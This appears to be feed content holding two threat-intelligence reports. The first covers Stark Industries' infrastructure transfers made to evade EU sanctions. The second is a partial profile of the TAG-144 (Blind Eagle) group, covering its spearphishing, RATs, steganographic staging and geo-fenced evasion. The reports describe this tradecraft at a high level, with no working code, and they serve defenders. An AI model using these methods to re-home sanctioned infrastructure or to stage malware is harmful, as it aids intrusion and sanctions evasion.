        <h2>Executive Summary</h2>
        <p>Prior to being designated for sanctions by the European Union on May 20, 2025, UK-registered web-hosting provider Stark Industries Solutions Ltd executed a series of infrastructure and organizational changes. Insikt Group assesses this activity to be a strategic effort to preempt impending sanctions and preserve operational continuity. Changes included the registration of a new entity in RIPE, PQ Hosting Plus S.R.L., and, as early as April 10, 2025, the migration of Russian infrastructure to UFO Hosting LLC. Notably, on May 8, 2025, twelve days prior to the sanctions, Moldovan and EU media reported on the forthcoming inclusion of the Neculiti brothers in the next EU sanctions package, citing leaked documentation.<br /><br />Following the sanctions, Insikt Group observed the rebranding of Stark Industries operations to “THE.Hosting”, under the control of Dutch entity “WorkTitans B.V.”, and the creation of a new autonomous system, AS209847 (THE), on June 24, 2025. Although the majority of associated infrastructure remains attributable to Stark Industries, these changes likely reflect an attempt to obfuscate ownership and sustain hosting services under new legal and network entities. Insikt Group assesses that the EU’s sanctioning of Stark Industries was largely ineffective, as affiliated infrastructure remained operational and services were rapidly re-established under new branding, with no significant or lasting disruption.<br /><br />This outcome highlights how threat activity enablers (TAEs) — entities that enable malicious cyber activity by providing infrastructure or services leveraged by threat actors — that retain such significant control over RIPE resources, such as Local Internet Registries (LIRs), Autonomous Systems (ASes), and IP prefixes, are particularly well-positioned to rebrand, reallocate infrastructure, and maintain operational continuity in the absence of meaningful intervention by RIPE NCC. More broadly, the case demonstrates the structural resilience of modern TAEs and underscores the need not only for sustained monitoring by network defenders but also for coordinated, cross-border collaboration among policymakers and law enforcement. Regional sanctions alone are insufficient; meaningfully disrupting TAEs operating at the scale of Stark Industries requires a comprehensive, multilateral approach.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>Stark Industries, along with its CEO and owner, was formally sanctioned by the Council of the European Union on May 20, 2025, for enabling Russian state-sponsored cyber operations, including information manipulation, infrastructure for cyberattacks, and other destabilizing hybrid threats against the EU and its partners.</li>
          <li>Stark Industries preempted its EU designation through a series of calculated infrastructure and organizational changes, including the registration of new RIPE entities and the early migration of Russian infrastructure to UFO Hosting LLC.</li>
          <li>On May 29, 2025, nine days after the EU designation, PQ.Hosting publicly rebranded to THE.Hosting, transferring assets and infrastructure to the Dutch-registered entity WorkTitans B.V. RIPE records show IP prefix and ASN transfers aligning with the rebrand, while website updates briefly referenced WorkTitans as the legal entity.</li>
          <li>All transitional entities, PQ Hosting Plus S.R.L., UFO Hosting LLC, and WorkTitans B.V., share RIPE maintainer objects linked to the email address jama**[@]gmail[.]com, which Insikt Group attributes to Dmitrii Miasnikov, a known Russian network operator. These maintainer objects were responsible for all associated RIPE organizations.</li>
          <li>Stark Industries’ pre- and post-sanctions activities reflect a deliberate, multi-phase restructuring designed to minimize the impact of EU designations while sustaining its role as a threat activity enabler (TAE). Despite sanctions, the entity successfully maintained infrastructure availability and operational continuity under alternative legal and network identities.</li>
        </ul>
        <h2>The Enduring Challenge of Threat Activity Enablers</h2>
        <p>The global cybersecurity landscape is increasingly shaped by the proliferation of threat activity enablers (TAEs), which are entities that enable malicious cyber activity by providing infrastructure or services leveraged by threat actors. Some such entities can present as lawful businesses, relying on legal or technical obfuscation to avoid accountability while tolerating varying degrees of malicious activity.</p>
        <p>This nuanced descriptor encompasses a broad spectrum of modern enabling services, such as hosting providers who selectively respond to abuse reports or law enforcement requests to maintain plausible deniability, to more traditional bulletproof hosting providers that ignore all oversight.<br /><br />TAEs that provide hosting services pose significant and enduring challenges for several reasons:</p>
        <ul>
          <li><strong>Obfuscation and Evasion:</strong> TAEs routinely navigate legal loopholes and use complex corporate structures, shell companies, and distributed infrastructure across multiple jurisdictions to obscure their true ownership and the nature of their services. This makes identification, attribution, and legal action exceedingly difficult for law enforcement and cybersecurity researchers.</li>
          <li><strong>RIPE Resource Abuse:</strong> Many TAEs maintain strategic control over RIPE (Réseaux IP Européens) resources, including IP ranges, Autonomous Systems (ASs), and associated registration objects, enabling them to manipulate and redistribute network resources at will. This infrastructure control allows TAEs to rapidly rebrand, spin up new entities, and distribute fresh subnets and ASNs, often to evade sanctions or scrutiny.</li>
          <li><strong>Enabling Diverse Threat Actors:</strong> By providing services such as web hosting, Virtual Private Servers (VPS), Virtual Private Networking (VPN) services, and proxy networks, TAEs can become critical enablers for a wide array of cyber threats. This includes ransomware operators, infostealer campaigns, botnets, state-aligned threat actors, hacktivists, and influence operations. Their services allow threat actors to maintain anonymity, launch attacks, and host malicious content with varying degrees of resiliency against takedown efforts.</li>
        </ul>
        <p>Insikt Group has tracked and reported on long-established and emerging TAEs, leveraging Recorded Future’s Network Intelligence to assess the concentration of malicious activity relative to the total size of IP space under an ASN’s control. This highlights operators whose infrastructure is disproportionately associated with threat activity.</p>
        <h2>Background</h2>
        <p>Stark Industries Solutions, a web-hosting provider that has recently drawn international attention due to recent sanctions, has roots deeply embedded in the hosting industry. It has evolved from the individual ventures of its founders to a sophisticated global network.</p>
        <p>Stark Industries was officially incorporated in the United Kingdom on February 10, 2022, notably just two weeks prior to Russia's full-scale invasion of Ukraine. The company primarily offers web-hosting services, including VPSs, <a href="https://krebsonsecurity.com/2024/05/stark-industries-solutions-an-iron-hammer-in-the-cloud/#:~:text=74%20VPN%20services%2C%20and%2040%20different%20proxy%20services">numerous</a> proxy services, and VPNs. It was founded by brothers Iurie Neculiti and Ivan Neculiti, whose involvement in illicit hosting dates back over a decade, as Ivan’s previous web-hosting service, Morenehost, <a href="https://correctiv.org/faktencheck/russland-ukraine/2024/05/16/hacks-und-propaganda-zwei-brueder-aus-moldau-tragen-russlands-digitalen-krieg-nach-europa/#:~:text=web%20hosting%20service%2C-,Morenehost,-%2C%20writes%20the%20IT">gained</a> notoriety for enabling cyber threats (his ownership was <a href="https://offshoreleaks.icij.org/nodes/240120865">revealed</a> through the <a href="https://www.icij.org/investigations/pandora-papers/investigators-worldwide-continue-to-open-pandoras-box-to-pursue-criminals-identified-in-pandora-papers-two-years-after-icijs-landmark-investigation/?gad_source=1&amp;gad_campaignid=20646016706&amp;gbraid=0AAAAACpCrOhNxDH5TPUfl3QeXD6K9oMkx&amp;gclid=CjwKCAjwy7HEBhBJEiwA5hQNogimdOqwA8iVIixypjK9dFRqwY4lcbTdisV-hgfzhyhFGH7A3DxfRBoCFuYQAvD_BwE">Pandora Papers</a> data leak).</p>
        <p>Stark Industries Solutions functioned mainly as a pass-through company designed to obscure the true nature of its operations. In effect, transactions with Stark Industries were transactions with PQ.Hosting, though this was not immediately apparent to external parties. Ivan Neculiti <a href="https://krebsonsecurity.com/2024/05/stark-industries-solutions-an-iron-hammer-in-the-cloud/#:~:text=Reached%20via%20LinkedIn%2C-,Mr.%20Neculiti%20said,-PQ%20Hosting%20established">characterized</a> Stark Industries as a "white label" brand, enabling resellers to distribute PQ.Hosting's services without direct customer interaction. The Neculiti brothers strategically established companies in Moldova, Russia, and Great Britain, creating a complex corporate structure engineered for obfuscation.</p>
        <p>Following the onset of the war in Ukraine, Stark Industries rapidly became a central platform for significant distributed denial-of-service (DDoS) attacks conducted by hacktivist group NoName057(16). Furthermore, Stark Industries' infrastructure was <a href="https://krebsonsecurity.com/2024/07/the-stark-truth-behind-the-resurgence-of-russias-fin7/">highlighted</a> in early 2024 as central to the resurgence of the financially motivated threat actor FIN7. As late as mid-2025, Insikt Group has continued to observe GrayAlpha, a threat cluster with significant overlap with FIN7, rely on Stark Industries' infrastructure.</p>
        <p>On May 20, 2025, the EU sanctioned Stark Industries Solutions Ltd, along with its CEO, Iurie Neculiti, and owner, Ivan Neculiti, for enabling Russian state-sponsored cyber operations, including information manipulation, cyberattacks, and other destabilizing hybrid activities targeting the EU and its partners. Insikt Group tracks Stark Industries Solutions Ltd (referenced hereafter as Stark Industries) and its parent company, PQ.Hosting, as threat activity enablers (TAEs) that enable a multitude of state-sponsored cyber operations linked to Russia, Iran, North Korea, and China, as well as cybercriminal groups.</p>
        <h2>Threat Analysis</h2>
        <h3>EU Sanctions Stark Industries</h3>
        <p>On May 20, 2025, the Council of the European Union <a href="https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=OJ:L_202500966#:~:text=9.-,Stark%20Industries%20Solutions%20Ltd.,-Date%20of%20registration">sanctioned</a> internet service provider (ISP) Stark Industries, along with its CEO, Iurie Neculiti, and owner, Ivan Neculiti. Insikt Group tracks Stark Industries and its parent organization, PQ.Hosting, as TAEs, enabling a multitude of state-sponsored cyber operations linked to Russia, Iran, North Korea, and China, as well as cybercriminal groups. Insikt Group notes that although PQ.Hosting was referenced within the sanctions multiple times alongside Stark Industries, the company itself was not sanctioned.

        <p>The EU attributed Stark Industries' infrastructure to enabling various Russian state-sponsored and affiliated threat actors to conduct destabilizing activities, including information manipulation, interference, and cyberattacks against the European Union and third countries. Furthermore, Insikt Group's 2024 Malicious Infrastructure Report highlighted Stark Industries' infrastructure as one of the top services enabling global cyber threats (see <strong>Figure 1</strong>). To view malware samples that exhibit network connections to Stark Industries' infrastructure, queries are available in <strong>Appendix A</strong> for Recorded Future’s Malware Intelligence module.</p>

        <h3>Timeline of Events</h3>
        <p>The following timeline is based on Insikt Group’s analysis conducted between May 16, 2025, and June 24, 2025. It outlines key events surrounding the EU’s sanctioning of Stark Industries, including pre-sanctions reporting, early infrastructure shifts, and post-designation rebranding.</p>

          </div>
        </div>
        <p>The sequence of events indicates that Stark Industries and its affiliated entities likely anticipated forthcoming EU sanctions, potentially as early as April 2025. Public reporting in Moldovan and EU media beginning in early May is highly likely to have triggered further operational shifts, including the creation of new corporate structures and early-stage infrastructure migration. These actions, occurring days before the official designation, suggest a deliberate attempt to mitigate the impact of sanctions and preserve the continuity of hosting services under alternative branding and network ownership.</p>
        <h3>Pre-Sanctions</h3>
        <h4>Exposure in Moldovan and EU Press</h4>
        <p>On May 8, 2025, the Moldovan arm of Radio Free Europe/Radio Liberty (RFE/RL) revealed that two Moldovan nationals, Ivan and Iurie Neculiti, founders of Stark Industries, were slated for inclusion in the EU’s next sanctions package targeting individuals involved in Russia’s hybrid warfare campaign. The article <a href="https://moldova.europalibera.org/a/ue-pregateste-sanctiuni-contra-a-doi-frati-de-la-bender-acuzati-ca-lupta-in-razboiul-hibrid-al-rusiei-impotriva-europei/33407343.html?fbclid=IwY2xjawKJZzFleHRuA2FlbQIxMABicmlkETFSS0I2dnFUUElhTjl1NW1XAR4Ru2puwD02sRMxGgT5cHxXcz6hVX-eckshjDUc0TC3Pi7qaPM9hNCesKTpxw_aem_Xk_9FkdSFATFB8dIUu1Uow">cited</a> direct access to a leaked EU document listing proposed designations, which accused the Neculiti brothers of enabling Russian state-sponsored destabilizing activities against the EU and its partners through their web-hosting company. A follow-up <a href="https://www.rferl.org/a/eu-russia-sanctions-package-ukraine-hungary-/33409397.html">article</a> released by RFE/RL’s central newsroom on May 9, 2025, further confirmed the proposed sanctions and framed them within the broader sanctions package under consideration by the European Commission.</p>
        <h4>Infrastructure Updates</h4>
        <p>On May 16, 2025, Insikt Group observed that the Autonomous System Number (ASN) AS44477, previously registered to Stark Industries, had been transferred to a newly created RIPE organization in the name of its parent company, PQ Hosting Plus S.R.L., under RIPE identifier <a href="https://apps.db.ripe.net/db-web-ui/lookup?source=RIPE&amp;type=organisation&amp;key=ORG-PHPS1-RIPE">ORG-PHPS1-RIPE</a>. This organization object was created just three days prior, on May 13, 2025, following RFE/RL’s reporting of the upcoming EU sanctions package (see <strong>Figure 3</strong>).</p>

        <p>Subsequent analysis initially linked the new organization to UFO Hosting LLC, a Russia-based internet service provider (ISP), via a shared email address, jama**[@]gmail[.]com, contained within the organization's new RIPE maintainer object, <a href="https://apps.db.ripe.net/db-web-ui/lookup?source=ripe&amp;key=PQHS-MNT&amp;type=mntner">PQHS-MNT</a>. However, upon analyzing <a href="https://bgp.tools/as/33993#prefixes">announcements</a> from UFO Hosting’s ASN, AS33993 (<a href="https://apps.db.ripe.net/db-web-ui/lookup?source=RIPE&amp;type=aut-num&amp;key=AS33993">UFO-AS</a>), it became apparent that Stark Industries was seemingly leveraging the provider to announce its Russian IP prefixes (see <strong>Figure 4</strong>).</p>

        <h4>UFO Hosting</h4>
        <p>UFO Hosting is a Russia-based ISP that was first registered with RIPE on March 13, 2025, under the RIPE identifier <a href="https://apps.db.ripe.net/db-web-ui/lookup?source=RIPE&amp;type=organisation&amp;key=ORG-UHL6-RIPE">ORG-UHL6-RIPE</a>. Russian company registration <a href="https://www.rusprofile.ru/person/savushkin-myu-504811063838">documents</a> list Savushkin Mikhail Yuryevich as the owner and the registration date as February 18, 2025.</p>
        <p>The company offers VPS/VDS and dedicated server hosting via its website ufo[.]hosting. The website’s user agreement section suggests the company is officially registered under the name YuFO Hosting (ЮФО Хостинг) in Moscow (see <strong>Figure 5</strong>).</p>

        <p><br />As of May 16, 2025, AS33993 (UFO-AS) announced 21 IP prefixes (see <strong>Appendix B</strong>). Insikt Group identified that all prefixes directly assigned to UFO Hosting’s RIPE organization (<a href="https://apps.db.ripe.net/db-web-ui/lookup?source=RIPE&amp;type=organisation&amp;key=ORG-UHL6-RIPE">ORG-UHL6-RIPE</a>) were transferred from Stark Industries. Most of these transfers occurred on April 13, 2025 (see <strong>Figure 6</strong>).</p>

        </div>
        <p>Insikt Group also identified several domains associated with Stark Industries and PQ.Hosting infrastructure resolving indirectly to IP addresses announced and controlled by UFO Hosting, further signaling an operational migration. While public DNS resolution showed these domains resolving to StormWall s.r.o DDoS protection endpoints, reverse DNS analysis of the underlying IP space revealed matching domain references on IP addresses transferred from Stark Industries (see <strong>Table 3</strong>).</p>

        <p>Insikt Group assesses with high confidence that UFO Hosting was established or repurposed as a vehicle for Russia-based infrastructure and clientele, providing a sanctions-resilient platform that enabled Stark Industries to discreetly migrate assets and maintain operational continuity ahead of EU enforcement.</p>
        <h3>Post-Sanctions</h3>
        <h4>Rebrand to THE.Hosting</h4>
        <p>On May 29, 2025, nine days after the EU formally sanctioned Stark Industries, its parent company, PQ.Hosting, announced a full rebranding and legal transition to a newly created entity, THE.Hosting. In a public statement, PQ.Hosting declared that the company had ceased to exist “as a legal entity and operational structure,” and that all assets, infrastructure, and services had been transferred to THE.Hosting, which would henceforth operate under new ownership and management (see <strong>Figure 7</strong>).</p>

        <p>The rebranded website, operating under a new domain, the[.]hosting, referenced WorkTitans B.V. as the legal entity behind THE.Hosting (See <strong>Figures 8</strong> and <strong>9</strong>). Insikt Group notes that as of June 24, 2025, THE.Hosting removed any reference to WorkTitans from its website.</p>

        <h4>WorkTitans B.V.</h4>
        <p>WorkTitans is a Netherlands-based company ostensibly registered and presenting as a recruitment firm, an affiliation that bears no logical connection to the hosting sector. This clear misalignment strongly suggests that Stark Industries used WorkTitans as its new Western corporate entity to obscure its continuity of control and insulate its rebranded infrastructure from sanctions. WorkTitans' website, worktitans[.]nl, displayed minimal functionality, with vague information about the company (see <strong>Figure 10</strong>) and a broken vacancy search page.</p>

        <h4>Infrastructure Updates</h4>
        <p>Insikt Group observed further changes to Stark Industries' infrastructure between May 29 and June 23, 2025, coinciding with the public rebranding of PQ.Hosting to THE.Hosting and the emergence of a new corporate vehicle, WorkTitans.</p>
        <p>On May 29, 2025, Insikt Group observed IP prefixes previously attributed to Stark Industries Solutions began transferring to a newly registered RIPE organization object under the name WorkTitans B.V. Its corresponding RIPE object, <a href="https://apps.db.ripe.net/db-web-ui/lookup?source=RIPE&amp;type=organisation&amp;key=ORG-THE3-RIPE">ORG-THE3-RIPE,</a> was created on May 28, 2025, the day before the public rebrand (see <strong>Figure 11</strong>).</p>

        <p>Insikt Group continued to monitor the transfer of IP prefixes to WorkTitans between May 29 and June 24, 2025, observing a new netname of THE-HOSTING. Further analysis of historical WHOIS records showed a clear progression — from initial assignment to Stark Industries to reassignment to PQ Hosting Plus S.R.L — leading up to the EU sanctions and subsequent transfer to WorkTitans following the rebrand (see <strong>Figure 12</strong>).</p>

        <p>In parallel with the observed prefix transfers, Insikt Group also tracked changes to ASN AS44477, registered initially to Stark Industries Solutions. While the responsible organization was updated to PQ Hosting Plus S.R.L., the ASNs name field was sequentially modified, first to reflect PQ.Hosting and, later, THE-HOSTING, aligning with the broader infrastructure rebrand (see <strong>Figure 13</strong>).</p>

        <h4>Maintainer Records and Links to Dmitrii Miasnikov</h4>
        <p>Insikt Group conducted further analysis on the email address jama**[@]gmail[.]com, which initially linked Stark Industries to UFO Hosting via RIPE database maintainer objects earlier in this report. This analysis revealed that the email address was not only associated with PQHS-MNT (PQ.Hosting maintainer) and <a href="https://apps.db.ripe.net/db-web-ui/lookup?source=ripe&amp;key=UFO42-MNT&amp;type=mntner">UFO42-MNT</a> (UFO Hosting maintainer), but also with the newly created <a href="https://apps.db.ripe.net/db-web-ui/lookup?source=RIPE&amp;type=mntner&amp;key=THE-HOSTING-MNT">THE-HOSTING-MNT</a>. As of June 24, 2025, these maintainer objects were responsible for all of the new RIPE organization objects outlined in this report, as well as further organizations tied to the Neculiti brothers, such as <a href="https://srl.md/en/societatea-cu-raspundere-limitata-weiss-hosting-group">WEISS HOSTING GROUP S.R.L.</a> (<a href="https://apps.db.ripe.net/db-web-ui/lookup?source=RIPE&amp;type=organisation&amp;key=ORG-PHS16-RIPE">ORG-PHD16-RIPE</a>; see <strong>Figure 16</strong>).</p>

        <p>Further research into this email address confirmed its attribution to Dmitrii Miasnikov, a known Russian network operator with prior affiliations to numerous Russia-based hosting providers. Specifically, the same email address was used to submit multiple RIPE NCC Executive Board <a href="https://mailman.ripe.net/archives/search?mlist=agm-nominations%40ripe.net&amp;q=Miasnikov">nominations</a> in April 2020 under Miasnikov’s name, listing various Russian hosting entities as his affiliated organizations).</p>
        <p>According to the RIPE database, Miasnikov also operates two LIRs under his own name, <a href="https://apps.db.ripe.net/db-web-ui/lookup?source=RIPE&amp;type=organisation&amp;key=ORG-DAM5-RIPE">ORG-DAM5-RIPE</a> and <a href="https://apps.db.ripe.net/db-web-ui/lookup?source=RIPE&amp;type=organisation&amp;key=ORG-DAM6-RIPE">ORG-DAM6-RIPE</a>. Insikt Group notes that as of June 24, 2025, only one prefix was assigned to ORG-DAM5-RIPE, 91[.]207[.]183[.]0/24, which was outlined in <strong>Appendix B</strong>, as announced via AS33993 (UFO-AS).</p>
        <p>Both objects contain the email address admin[@]virty[.]io, which refers to another Russian ISP, virty[.]io, which is owned by First Data Center LLC (ООО "Первый ЦОД"). In addition to traditional hosting, the company offers a number of what it calls “RIPE Object Support and Registration Services” (see <strong>Figure 17</strong>).</p>

        </div>
        <p>Insikt Group assesses that Miasnikov’s control over RIPE object registration services, combined with his access to multiple LIRs and maintainer objects, likely enabled him to facilitate the creation, transfer, and operational handoff of RIPE assets for Stark Industries, allowing the sanctioned entity to sustain infrastructure continuity under new organizational entities.</p>
        <h2>Mitigations</h2>
        <ul>
          <li><strong>Use Recorded Future Threat Intelligence:</strong> Recorded Future customers can proactively mitigate threats originating from malicious networks such as Stark Industries by operationalizing Recorded Future Intelligence Cloud data, specifically by leveraging continuously updated Risk Lists and by blocklisting validated malicious IP addresses to prevent internal communication with malicious infrastructure.</li>
          <li><strong>Implement Robust Network Security Controls:</strong> Configure perimeter security appliances and internal network defenses to block traffic originating from the ASNs identified in this report, unless there is a clearly defined business justification for permitting such traffic.</li>
        </ul>
        <h2>Outlook</h2>
        <p>Insikt Group assesses that Stark Industries will likely continue operating with minimal disruption under its new corporate entities, THE.Hosting and UFO Hosting, despite its inclusion in the EU’s May 2025 sanctions package. The evidence outlined in this report demonstrates that the organization likely anticipated the EU sanctions and executed a deliberate, multi-phase restructuring of its hosting operations, using its parent company, PQ.Hosting, and Russian ISP, UFO Hosting.</p>
        <p>While the EU sanctions did reference PQ.Hosting, the company’s omission from a formal designation as part of the package, along with other linked entities, may have been a critical gap. This allowed Stark Industries to rapidly rebrand, transfer assets, and preserve operational control through affiliated RIPE organizations and front companies with relative ease.</p>
        <p>Insikt Group will continue to monitor the infrastructure, affiliations, and evolution of this TAE network, as its persistent role in supporting global malicious cyber operations remains a critical indicator of future threat activity.</p>

Explore the latest threat clusters, TTPs, and mitigation strategies.]]></description>
            <content:encoded><![CDATA[
        <p><em>Note: The analysis cut-off date for this report was July 21, 2025.</em></p>
        <h2>Executive Summary</h2>
        <p>Insikt Group has identified five distinct activity clusters linked to TAG-144 (also known as Blind Eagle). These clusters have operated at various times throughout 2024 and 2025, targeting a significant number of victims, primarily within the Colombian government across local, municipal, and federal levels. Although the clusters share similar tactics, techniques, and procedures (TTPs) such as leveraging open-source and cracked remote access trojans (RATs), dynamic domain providers, and legitimate internet services (LIS) for staging, they differ significantly in infrastructure, malware deployment, and other operational methods. Insikt Group also found further evidence linking TAG-144 to Red Akodon and identified various compromised Colombian government email accounts likely used in spearphishing campaigns.</p>
        <p>To protect against TAG-144, security defenders should block IP addresses and domains tied to associated RATs, flag and potentially block connections to unusual LIS, and deploy updated detection rules (YARA, Sigma, Snort) for current and historic infections. Other controls include implementing email filtering and data exfiltration monitoring. See the <strong>Mitigations</strong> section for implementation guidance and <strong>Appendix B</strong> for a complete list of IoCs. In the long term, analysts should continuously monitor the cybercriminal ecosystem for emerging threats and adapt controls accordingly.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>Insikt Group has tracked five distinct activity clusters associated with TAG-144 (Blind Eagle), each displaying overlapping yet varied TTPs and collectively targeting numerous victims, primarily within the Colombian government, throughout 2024 and 2025.</li>
          <li>TAG-144 appears to maintain an extensive operational infrastructure, comprising virtual private servers (VPS), IP addresses within Colombian ISP ranges, and servers that appear to function as VPN servers. These typically host domains registered through various dynamic DNS services such as <em>duckdns[.]org</em>, <em>noip[.]com</em>, and <em>con-ip[.]com</em>, among others.</li>
          <li>TAG-144 has employed a wide array of open-source and cracked RATs, including AsyncRAT, DcRAT, REMCOS RAT, XWorm, and LimeRAT, among others. These payloads are typically deployed through a multi-stage infection chain that leverages an expanding set of LIS and uses steganography to obscure malicious content and evade detection.</li>
        </ul>
        <h2>Background</h2>
        <p>TAG-144, also known as Blind Eagle, AguilaCiega, APT-C-36, and APT-Q-98, is a threat group that has been <a href="https://cyberpress.org/new-apt-group-blindeagle-strikes-organizations/">active</a> since at least 2018, primarily targeting South America, especially Colombia. While the threat group’s overall motivation <a href="https://securelist.com/blindeagle-apt/113414/">remains</a> ambiguous, its activity reflects both cyber-espionage and financially driven motivations. TAG-144’s primary focus appears to be on credential theft, evidenced by banking-related keylogging and browser monitoring, alongside indications of espionage, such as persistently targeting government entities and using modified RATs with surveillance functions (<a href="https://www.trendmicro.com/en_ph/research/21/i/apt-c-36-updates-its-long-term-spam-campaign-against-south-ameri.html">1</a>, <a href="https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/">2</a>).</p>
        <p>The group’s primary targets include government institutions, especially judiciary and tax authorities, alongside financial entities, petroleum and energy companies, and organizations within the education, healthcare, manufacturing, and professional services sectors (<a href="https://hivepro.com/wp-content/uploads/2024/09/TA2024345.pdf">1</a>, <a href="https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/">2</a>). Operations are mainly focused on Colombia, with additional activity in <a href="https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/">Ecuador</a>, <a href="https://securelist.com/blindeagle-apt/113414/">Chile</a>, and <a href="https://securelist.com/blindeagle-apt/113414/">Panama</a>, and occasional campaigns in North America <a href="https://www.esentire.com/blog/blind-eagles-north-american-journey">targeting</a> Spanish-speaking users.</p>
        <p>Initial access typically <a href="https://lab52.io/blog/apt-c-36-recent-activity-analysis/">occurs</a> through spearphishing campaigns impersonating local government agencies, most notably Colombian authorities. These campaigns leverage themes such as debt collection and judicial notifications to lure victims into opening malicious documents (<a href="https://blog.scilabs.mx/malware-campaign-attributed-to-apt-c-36-context-and-iocs-update-june-2022/">1</a>, <a href="https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/">2</a>). They have often <a href="https://www.trendmicro.com/en_ph/research/21/i/apt-c-36-updates-its-long-term-spam-campaign-against-south-ameri.html">used</a> URL shorteners like <em>cort[.]as</em>, <em>acortaurl[.]com</em>, and <em>gtly[.]to</em> to conceal malicious links and target users geographically. TAG-144 employs geo-fencing and other detection evasion measures that <a href="https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/">block</a> access from outside Colombia or Ecuador, <a href="https://www.trendmicro.com/en_ph/research/21/i/apt-c-36-updates-its-long-term-spam-campaign-against-south-ameri.html">redirecting</a> outsiders to official government websites. TAG-144 has consistently leveraged compromised email accounts in its spearphishing campaigns, including those associated with government entities and private individuals.</p>
        <p>TAG-144 leverages a range of commodity remote access trojans (RATs), including AsyncRAT, REMCOS RAT, DcRAT, njRAT, LimeRAT, QuasarRAT, BitRAT, and a Quasar variant <a href="https://www.zscaler.com/blogs/security-research/blindeagle-targets-colombian-insurance-sector-blotchyquasar">known</a> as BlotchyQuasar. Its tooling also <a href="https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/">involves</a> crypters such as HeartCrypt, PureCrypter, and those developed by threat actors like “Roda” and “pjoao1578”, with indicators pointing to the use of crypter-as-a-service offerings such as CryptersAndTools, which originates from Brazil. Additionally, it <a href="https://securelist.com/blindeagle-apt/113414/">employs</a> steganography techniques, embedding malicious payloads within image files to evade detection.</p>
        <p>TAG-144’s command-and-control (C2) infrastructure often <a href="https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/">incorporates</a> IP addresses from Colombian ISPs alongside virtual private servers (VPS) such as Proton666 and VPN services like Powerhouse Management, FrootVPN, and TorGuard (<a href="https://lab52.io/blog/apt-c-36-recent-activity-analysis/">1</a>, <a href="https://censys.com/blog/unmasking-the-infrastructure-of-a-spearphishing-campaign">2</a>). This setup is further <a href="https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia">enhanced</a> by the use of dynamic DNS services, including <em>duckdns[.]org</em>, <em>ip-ddns[.]com</em>, and <em>noip[.]com</em>. The threat group is suspected, though not definitively confirmed, to use compromised routers, which are then repurposed as reverse proxies to obscure the true locations of their C2 servers and complicate attribution.</p>
        <p>The threat group has consistently leveraged LIS, particularly during the payload staging phase. These services include widely used platforms like Bitbucket, Discord, Dropbox, GitHub, Google Drive, Paste.ee, and lesser-known platforms such as undisclosed Brazilian image-hosting websites. Additionally, the group has been observed using compromised accounts to host malicious content, including a Google Drive folder <a href="https://www.zscaler.com/blogs/security-research/blindeagle-targets-colombian-insurance-sector-blotchyquasar">tied</a> to a compromised account associated with a regional Colombian government organization.</p>
        <p>The threat group's origin remains uncertain, though multiple studies suggest it operates within the UTC-5 or UTC-4 time zones (<a href="https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/">1</a>, <a href="https://web.archive.org/web/20190625182633/https://ti.360.net/blog/articles/apt-c-36-continuous-attacks-targeting-colombian-government-institutions-and-corporations-en/">2</a>), consistent with countries like Colombia and Ecuador, with some research specifically pointing to Colombia as its base. Notably, technical artifacts have <a href="https://www.kaspersky.com/about/press-releases/kaspersky-identifies-blindeagles-new-spy-plugin">contained</a> both Spanish- and Portuguese-language comments. The Spanish <a href="https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/">observed</a> in the comments closely resembles the regional dialects commonly spoken in the targeted countries. Additionally, the threat group has been observed using tools and services tied to the Brazilian cybercriminal underground, <a href="https://www.kaspersky.com/about/press-releases/kaspersky-identifies-blindeagles-new-spy-plugin">indicating</a> a possible connection with Brazilian threat actors.</p>
        <p>Three key factors set TAG-144 apart within the cybercriminal ecosystem. First, while globalization, cybercriminal collaboration, and hardware/software standardization have lowered barriers for threat actors to operate globally, threat actors, including TAG-144, often remain regionally focused due to cultural nuances, tacit knowledge, and persistence. Second, despite some tooling improvements, TAG-144 has largely relied on consistent techniques since its emergence. Their continued success, reflected in a high number of victims, underscores how well-established methods remain effective over time. Lastly, TAG-144 exemplifies the increasingly blurred lines between cybercrime and espionage, a trend that has become more prominent in the coming year. In this context, a comprehensive approach to tackling cyber threats becomes even more crucial, requiring improved defenses, deeper regional knowledge, and enhanced coordination.</p>
        <h2>Threat Analysis</h2>
        <p>Insikt Group identified five activity clusters associated with TAG-144 that were active between May 2024 and July 2025 (see <strong>Figure 1</strong>). Activity periods were determined based on domain resolutions, sample submissions, and victim traffic, as observed through <a href="https://assets.recordedfuture.com/Datasheets/Datasheet-Network-Intelligence.pdf">Recorded Future® Network Intelligence</a>.</p>

          </div>
        </div>
        <p>The following clusters have been observed:</p>
        <ul>
          <li><strong>Cluster 1</strong>, active from February through July 2025, comprises C2 IPs primarily associated with TorGuard VPN and one Colombian ISP hosting <em>duckdns[.]org</em> and, starting in July 2025, <em>noip[.]com</em> domains with static resolution and minimal rotation. Cluster 1 is linked to DcRAT, AsyncRAT, and REMCOS RAT infections targeting Colombian government entities exclusively.</li>
          <li><strong>Cluster 2</strong>, active between September and December 2024, included C2 IPs tied to AS-COLOCROSSING, Colombian ISPs, and VULTR hosting <em>duckdns[.]org</em>, <em>con-ip[.]com</em>, and <em>kozow[.]com</em> domains. Cluster 2 is associated with AsyncRAT activity targeting the Colombian government and entities in the education, defense, and retail sectors.</li>
          <li><strong>Cluster 3</strong>, active from September 2024 to July 2025, consists of C2 IPs linked to Colombian ISP UNE EPM hosting <em>duckdns[.]org</em> and, occasionally, <em>con-ip[.]com</em> domains. Cluster 3 is associated with both AsyncRAT and REMCOS RAT deployments.</li>
          <li><strong>Cluster 4</strong>, active from May 2024 to February 2025, is notable for combining malware and phishing infrastructure attributed to TAG-144.</li>
          <li><strong>Cluster 5</strong>, active from March to July 2025, consists of C2 IPs linked to GLESYS (AS42708) hosting dynamically resolving <em>duckdns[.]org</em> domains. Cluster 5 is associated with LimeRAT and a cracked AsyncRAT variant seen in Clusters 1 and 2.</li>
        </ul>
